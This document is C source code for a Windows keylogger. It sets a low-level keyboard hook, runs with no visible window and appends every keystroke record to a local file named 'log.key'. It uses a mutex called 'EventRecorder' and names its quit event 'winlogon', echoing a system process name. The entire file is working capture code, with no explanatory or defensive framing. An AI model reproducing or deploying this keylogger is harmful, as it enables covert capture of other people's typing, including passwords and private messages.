
#include <windows.h>
#include <stdio.h>

FILE* logFile;
char bufferForKeys[100];

BYTE keyState[256];
WCHAR buffer[16];
SYSTEMTIME sysTime;

HANDLE singleInstanceMutexHandle;
HHOOK keyboardHookHandle;
HANDLE quitEventHandle;

void LogToFile( char* data )
{
    fputs( data, logFile );
    fflush( logFile );
}

LRESULT CALLBACK KeyboardHookDelegate( int nCode, WPARAM wParam, LPARAM lParam )
{

	BOOL isDown = FALSE;
  	BOOL isUp = FALSE;

    if (nCode == HC_ACTION)
    {
      PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

      isDown = wParam==WM_KEYDOWN || wParam==WM_SYSKEYDOWN;
      isUp = wParam==WM_KEYUP || wParam==WM_SYSKEYUP;
      GetKeyboardState((PBYTE)&keyState);

      // fprintf(logFile, "%02x", isDown);
      fwrite(p, sizeof(KBDLLHOOKSTRUCT), 1, logFile);
      fflush( logFile );

      //sprintf( bufferForKeys, "%d : %d : %X %X %X %X %X\n", GetTickCount(), isDown, p->vkCode, p->scanCode, p->flags, p->time, p->dwExtraInfo);
      //LogToFile( bufferForKeys );
    }

    return CallNextHookEx( NULL, nCode, wParam, lParam );
}

DWORD WINAPI ThreadedCode( LPVOID )
{
    WaitForSingleObject( quitEventHandle, INFINITE );
    
    CloseHandle( singleInstanceMutexHandle );
    CloseHandle( quitEventHandle );
    UnhookWindowsHookEx( keyboardHookHandle );
    fclose( logFile );
    
    ExitProcess( 0 );
    
    return 0;
}

int WINAPI WinMain( HINSTANCE currentInstance, HINSTANCE previousInstance, LPSTR commandLine, int showMode )
{
    const char singleInstanceMutexName[] = "EventRecorder";
    const char quitEventName[] = "winlogon";
    
    singleInstanceMutexHandle = CreateMutex( NULL, TRUE, singleInstanceMutexName );
    int isAlreadyRunning = GetLastError() == ERROR_ALREADY_EXISTS;
        
    if( !isAlreadyRunning )
    {
        
        char logFilePath[MAX_PATH] = { 0 };
        sprintf( logFilePath, "log.key" );
        
        logFile = fopen( logFilePath, "a" );
        keyboardHookHandle = SetWindowsHookEx( WH_KEYBOARD_LL, KeyboardHookDelegate, currentInstance, 0 );
        {
            quitEventHandle = CreateEvent( NULL, FALSE, FALSE, quitEventName );
            
            int threadId;
            CreateThread( NULL, 0, ThreadedCode, 0, 0, &threadId );
            
            MSG message;
            while( GetMessage( &message, NULL, 0, 0 ) )
            {}
        }
    }
    else
    {
        quitEventHandle = OpenEvent( EVENT_ALL_ACCESS, FALSE, quitEventName );
        SetEvent( quitEventHandle );
    }

    return 0;
}
